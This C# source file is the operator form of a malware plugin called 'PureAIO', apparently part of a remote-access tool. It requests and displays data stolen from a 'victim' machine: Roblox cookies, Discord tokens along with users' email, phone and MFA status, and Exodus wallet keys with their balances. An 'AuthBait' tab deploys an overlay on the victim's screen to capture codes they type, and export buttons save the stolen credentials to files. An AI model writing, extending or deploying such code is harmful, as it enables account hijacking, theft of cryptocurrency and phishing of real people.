using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PluginSDK.Interfaces;
using PluginSDK.Packets;
using ProtoBuf;

namespace PureAIO
{
    public partial class Form1 : Form
    {
        // ── connection ────────────────────────────────────────────────────────
        private Action<IPacket> _send;

        public void SetSend(Action<IPacket> send)
        {
            _send = send;
            SetConnected(true);
        }

        public void SetConnected(bool connected)
        {
            if (InvokeRequired) { Invoke(new Action<bool>(SetConnected), connected); return; }
            lblConnectionStatus.Text      = connected ? "● Connected" : "○ Not connected";
            lblConnectionStatus.ForeColor = connected
                ? Color.FromArgb(60, 180, 100)
                : Color.FromArgb(237, 66, 69);
        }

        public Form1()
        {
            InitializeComponent();
        }

        // ── packet dispatch (called by ServerPlugin) ─────────────────────────
        public void HandlePacket(AIOPacket pkt)
        {
            if (InvokeRequired) { Invoke(new Action<AIOPacket>(HandlePacket), pkt); return; }

            switch (pkt)
            {
                case RobloxCookieResponse r:   HandleRobloxResponse(r);   break;
                case DiscordTokenResponse d:   HandleDiscordResponse(d);  break;
                case ExodusResponse       e:   HandleExodusResponse(e);   break;
                case AuthBaitCodeResponse ab:  HandleAuthBaitResponse(ab); break;
            }
        }

        // ── send helper ───────────────────────────────────────────────────────
        private void SendPacket(AIOPacket pkt)
        {
            if (_send == null) return;
            try
            {
                using (var ms = new MemoryStream())
                {
                    Serializer.Serialize(ms, pkt);
                    _send(new CustomPacket { Buffer = ms.ToArray() });
                }
            }
            catch (Exception ex)
            {
                // send error — no log panel in context, swallow silently
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  AUTH BAIT TAB
        // ══════════════════════════════════════════════════════════════════════
        private void btnStartAuthBait_Click(object sender, EventArgs e)
        {
            btnStartAuthBait.Enabled = false;
            lblAuthBaitStatus.Text   = "⏳ Waiting for victim to enter code…";
            lblAuthBaitStatus.ForeColor = Color.FromArgb(255, 200, 100);
            rtbAuthBait.Clear();
            AppendLog(rtbAuthBait, "[*] AuthBait started — overlay deployed on victim machine.", Color.FromArgb(100, 200, 255));
            SendPacket(new AuthBaitStartRequest());
        }

        private void HandleAuthBaitResponse(AuthBaitCodeResponse r)
        {
            btnStartAuthBait.Enabled = true;

            if (r.Success)
            {
                lblAuthBaitStatus.Text      = "✅ Code captured!";
                lblAuthBaitStatus.ForeColor = Color.FromArgb(100, 220, 100);
                AppendLog(rtbAuthBait, $"[✓] Code: {r.Code}", Color.FromArgb(100, 255, 100));
                // big visible code display
                lblCapturedCode.Text      = r.Code;
                lblCapturedCode.Visible   = true;
            }
            else
            {
                lblAuthBaitStatus.Text      = $"✗ Failed: {r.Error}";
                lblAuthBaitStatus.ForeColor = Color.FromArgb(255, 100, 100);
                AppendLog(rtbAuthBait, $"[✗] Error: {r.Error}", Color.FromArgb(255, 100, 100));
                lblCapturedCode.Visible = false;
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  ROBLOX TAB
        // ══════════════════════════════════════════════════════════════════════
        private void btnRobloxCheck_Click(object sender, EventArgs e)
        {
            var raw = txtRobloxInput.Text.Trim();

            lvRoblox.Items.Clear();
            lblRobloxStatus.Text = "Checking…";

            if (!string.IsNullOrEmpty(raw))
            {
                AppendLog(rtbRobloxLog, $"[*] Checking {CountLines(raw)} cookie(s)…", Color.FromArgb(100, 200, 255));
                _pendingRobloxInput = raw.Split(new[] { '\n', '\r' },
                                                StringSplitOptions.RemoveEmptyEntries)
                                         .Select(s => s.Trim())
                                         .Where(s => s.Length > 0)
                                         .ToList();
            }
            else
            {
                AppendLog(rtbRobloxLog, "[*] Re-requesting auto-collected cookies from victim…", Color.FromArgb(100, 200, 255));
            }

            SendPacket(new RobloxCookieRequest());
        }

        private List<string> _pendingRobloxInput = new List<string>();

        private void HandleRobloxResponse(RobloxCookieResponse r)
        {
            lblRobloxStatus.Text = r.Success
                ? $"{r.Cookies?.Count ?? 0} cookie(s) found"
                : $"Error: {r.Error}";

            if (!r.Success)
            {
                AppendLog(rtbRobloxLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
                return;
            }

            lvRoblox.Items.Clear();

            if (r.Cookies == null || r.Cookies.Count == 0)
            {
                AppendLog(rtbRobloxLog, "[*] No cookies found on victim.", Color.FromArgb(200, 200, 200));
                return;
            }

            foreach (var c in r.Cookies)
            {
                var item = new ListViewItem(c.Username ?? "?");
                item.SubItems.Add(c.UserId.ToString());
                item.SubItems.Add(c.Robux.ToString());
                item.SubItems.Add(c.IsPremium ? "✓" : "");
                item.SubItems.Add(c.TwoStepEnabled ? "✓" : "");
                item.SubItems.Add(c.Country ?? "");
                item.SubItems.Add(c.Source ?? "");
                item.SubItems.Add(c.Value?.Length > 20 ? c.Value.Substring(0, 20) + "…" : c.Value ?? "");
                item.Tag = c;
                lvRoblox.Items.Add(item);
            }

            AppendLog(rtbRobloxLog,
                $"[✓] Got {r.Cookies.Count} cookie(s).",
                Color.FromArgb(100, 255, 100));
        }

        private void btnRobloxCopy_Click(object sender, EventArgs e)
        {
            if (lvRoblox.SelectedItems.Count == 0) return;
            var sb = new StringBuilder();
            foreach (ListViewItem it in lvRoblox.SelectedItems)
            {
                if (it.Tag is CookieEntry c)
                    sb.AppendLine(c.Value);
            }
            Clipboard.SetText(sb.ToString().TrimEnd());
        }

        private void btnRobloxExport_Click(object sender, EventArgs e)
        {
            if (lvRoblox.Items.Count == 0) return;
            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "roblox_cookies" })
            {
                if (dlg.ShowDialog() != DialogResult.OK) return;
                var sb = new StringBuilder();
                sb.AppendLine("Username|UserID|Robux|Premium|2FA|Country|Source|Cookie");
                foreach (ListViewItem it in lvRoblox.Items)
                {
                    if (it.Tag is CookieEntry c)
                        sb.AppendLine($"{c.Username}|{c.UserId}|{c.Robux}|{c.IsPremium}|{c.TwoStepEnabled}|{c.Country}|{c.Source}|{c.Value}");
                }
                File.WriteAllText(dlg.FileName, sb.ToString());
                AppendLog(rtbRobloxLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  DISCORD TAB
        // ══════════════════════════════════════════════════════════════════════
        private void btnDiscordCheck_Click(object sender, EventArgs e)
        {
            var raw = txtDiscordInput.Text.Trim();

            lvDiscord.Items.Clear();
            lblDiscordStatus.Text = "Checking…";

            if (!string.IsNullOrEmpty(raw))
                AppendLog(rtbDiscordLog, $"[*] Checking {CountLines(raw)} token(s)…", Color.FromArgb(100, 200, 255));
            else
                AppendLog(rtbDiscordLog, "[*] Re-requesting auto-collected tokens from victim…", Color.FromArgb(100, 200, 255));

            SendPacket(new DiscordTokenRequest());
        }

        private void HandleDiscordResponse(DiscordTokenResponse r)
        {
            lblDiscordStatus.Text = r.Success
                ? $"{r.Tokens?.Count ?? 0} token(s) found"
                : $"Error: {r.Error}";

            if (!r.Success)
            {
                AppendLog(rtbDiscordLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
                return;
            }

            lvDiscord.Items.Clear();

            if (r.Tokens == null || r.Tokens.Count == 0)
            {
                AppendLog(rtbDiscordLog, "[*] No tokens found on victim.", Color.FromArgb(200, 200, 200));
                return;
            }

            foreach (var t in r.Tokens)
            {
                var nitro = t.NitroType switch
                {
                    1 => "Classic",
                    2 => "Nitro",
                    3 => "Basic",
                    _ => "None"
                };
                var item = new ListViewItem(t.Username ?? "?");
                item.SubItems.Add(t.UserId ?? "");
                item.SubItems.Add(t.Email ?? "");
                item.SubItems.Add(t.Phone ?? "");
                item.SubItems.Add(t.MfaEnabled ? "✓" : "");
                item.SubItems.Add(nitro);
                item.SubItems.Add(t.Source ?? "");
                item.SubItems.Add(t.Value?.Length > 20 ? t.Value.Substring(0, 20) + "…" : t.Value ?? "");
                item.Tag = t;
                lvDiscord.Items.Add(item);
            }

            AppendLog(rtbDiscordLog,
                $"[✓] Got {r.Tokens.Count} token(s).",
                Color.FromArgb(100, 255, 100));
        }

        private void btnDiscordCopy_Click(object sender, EventArgs e)
        {
            if (lvDiscord.SelectedItems.Count == 0) return;
            var sb = new StringBuilder();
            foreach (ListViewItem it in lvDiscord.SelectedItems)
            {
                if (it.Tag is TokenEntry t)
                    sb.AppendLine(t.Value);
            }
            Clipboard.SetText(sb.ToString().TrimEnd());
        }

        private void btnDiscordExport_Click(object sender, EventArgs e)
        {
            if (lvDiscord.Items.Count == 0) return;
            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "discord_tokens" })
            {
                if (dlg.ShowDialog() != DialogResult.OK) return;
                var sb = new StringBuilder();
                sb.AppendLine("Username|UserID|Email|Phone|MFA|Nitro|Source|Token");
                foreach (ListViewItem it in lvDiscord.Items)
                {
                    if (it.Tag is TokenEntry t)
                    {
                        var nitro = t.NitroType switch
                        {
                            1 => "Classic",
                            2 => "Nitro",
                            3 => "Basic",
                            _ => "None"
                        };
                        sb.AppendLine($"{t.Username}|{t.UserId}|{t.Email}|{t.Phone}|{t.MfaEnabled}|{nitro}|{t.Source}|{t.Value}");
                    }
                }
                File.WriteAllText(dlg.FileName, sb.ToString());
                AppendLog(rtbDiscordLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  EXODUS TAB
        // ══════════════════════════════════════════════════════════════════════
        private void HandleExodusResponse(ExodusResponse r)
        {
            lblExodusStatus.Text = r.Success
                ? $"{r.Items?.Count ?? 0} wallet item(s)"
                : $"Error: {r.Error}";

            if (!r.Success)
            {
                AppendLog(rtbExodusLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
                return;
            }

            lvExodus.Items.Clear();
            lvExodusBalances.Items.Clear();

            if ((r.Items == null || r.Items.Count == 0) &&
                (r.Balances == null || r.Balances.Count == 0))
            {
                AppendLog(rtbExodusLog, "[*] No Exodus wallet data found.", Color.FromArgb(200, 200, 200));
                return;
            }

            if (r.Items != null)
            {
                foreach (var item in r.Items)
                {
                    var lvi = new ListViewItem(item.Kind ?? "?");
                    lvi.SubItems.Add(item.Value ?? "");
                    lvi.Tag = item;
                    lvExodus.Items.Add(lvi);
                }
            }

            if (r.Balances != null)
            {
                foreach (var b in r.Balances)
                {
                    var lvi = new ListViewItem(b.Ticker ?? "?");
                    lvi.SubItems.Add(b.Balance ?? "");
                    lvi.SubItems.Add(b.FiatValue ?? "");
                    lvExodusBalances.Items.Add(lvi);
                }
            }

            AppendLog(rtbExodusLog,
                $"[✓] {r.Items?.Count ?? 0} key(s), {r.Balances?.Count ?? 0} balance(s).",
                Color.FromArgb(100, 255, 100));
        }

        private void btnExodusExport_Click(object sender, EventArgs e)
        {
            if (lvExodus.Items.Count == 0) return;
            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "exodus_wallet" })
            {
                if (dlg.ShowDialog() != DialogResult.OK) return;
                var sb = new StringBuilder();
                sb.AppendLine("=== WALLET KEYS ===");
                foreach (ListViewItem it in lvExodus.Items)
                {
                    if (it.Tag is ExodusDataEntry d)
                        sb.AppendLine($"{d.Kind}: {d.Value}");
                }
                sb.AppendLine("\n=== BALANCES ===");
                foreach (ListViewItem it in lvExodusBalances.Items)
                    sb.AppendLine($"{it.Text}: {it.SubItems[1].Text} ({it.SubItems[2].Text} USD)");

                File.WriteAllText(dlg.FileName, sb.ToString());
                AppendLog(rtbExodusLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  HELPERS
        // ══════════════════════════════════════════════════════════════════════
        private static void AppendLog(RichTextBox rtb, string msg, Color color)
        {
            rtb.SelectionStart  = rtb.TextLength;
            rtb.SelectionLength = 0;
            rtb.SelectionColor  = Color.FromArgb(120, 120, 130);
            rtb.AppendText($"[{DateTime.Now:HH:mm:ss}] ");
            rtb.SelectionStart  = rtb.TextLength;
            rtb.SelectionLength = 0;
            rtb.SelectionColor  = color;
            rtb.AppendText(msg + "\n");
            rtb.ScrollToCaret();
        }

        private static int CountLines(string s) =>
            s.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries).Length;
    }
}
